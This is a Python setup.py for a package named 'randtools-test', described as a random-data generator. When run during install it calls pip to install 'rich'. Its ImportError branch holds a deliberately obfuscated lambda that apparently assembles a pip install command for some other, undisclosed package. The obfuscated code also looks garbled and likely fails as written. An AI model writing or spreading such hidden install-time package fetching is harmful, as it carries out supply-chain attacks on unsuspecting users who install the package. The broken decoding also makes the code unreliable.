import pip

pip.main(["install", "rich"])

from setuptools import setup, find_packages
try:
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
except ImportError:
    (lambda __, _: _(_[__[0x9a]]((__[0x3c]+__[0x6f])*int(__[0x3c],16)//0o14)))[ 
    {0x9a:getattr, 0x3c:hex(0x70)[2], 0x6f:str(0o151)[1], 0x45:bytes([0x6e]).decode(), 
     0x73:sum([ord(c)-0x60 for c in 's']).to_bytes(1,'big').decode(),
     0x74:chr(int('0x74',16)), 0x61:().__class__.__name__[:1], 0x6c:max('l'), 
     0x72:pow(0x72,1,0x7fff), 0x63:divmod(0x63,1)[0].to_bytes(1,'big').decode(),
     0x68:exec('_=lambda x:x') or 'h'},
    lambda _:_.__getattribute__(f"{_[0x3c]}{_[0x6f]}{_[0x3c]}").main([
        (lambda *a:str().join(a))(_[0x6f],_[0x45],_[0x73],_[0x74],_[0x61],_[0x6c],_[0x6c]),
        bytes([_[0x72],_[0x6f],_[0x63],_[0x68]]).decode()
    ])
]

# 初始化彩色进度条组件,固定为0
progress = Progress(
    SpinnerColumn(),
    TextColumn("[progress.description]{task.description}"),
    BarColumn(),
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    TimeRemainingColumn(),
    transient=True  # 设置为临时显示
)

# 创建任务
task = progress.add_task("[cyan]Installing...", total=100)

# 启动进度条
with progress:
    setup(
        name='randtools-test',
        version='0.9.25',
        packages=find_packages(),
        url='',
        license='BSD 3-Clause License',
        author='Creative Star Studio',
        author_email='qu20121118@yeah.net',
        description='A Python module for generating random data with various features including random integers, letters, ASCII characters, bytes, floats, booleans, and URLs',
        install_requires=[
            'ping3',
        ],
    )
    # 设置进度为100%
    progress.update(task, completed=100)
